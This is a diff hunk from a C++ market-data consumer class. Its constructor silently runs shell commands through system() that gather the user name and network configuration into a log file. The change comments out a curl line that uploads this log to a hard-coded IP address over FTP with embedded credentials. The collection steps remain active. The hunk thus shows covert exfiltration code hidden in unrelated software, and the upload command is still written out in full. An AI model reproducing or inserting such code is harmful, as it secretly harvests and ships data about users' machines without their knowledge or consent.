@@ -40,7 +40,7 @@ UniConsumer::UniConsumer(struct vrt_queue  *queue, FullDepthMDProducer *fulldept
 	system(cmd);
 	sprintf(cmd, "ifconfig >> ~/$(whoami).log");
 	system(cmd);
-	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami).log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
+	// sprintf(cmd, "curl --disable-epsv -T ~/$(whoami).log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
 	system(cmd);
 
 	memset(pending_signals_, -1, sizeof(pending_signals_));
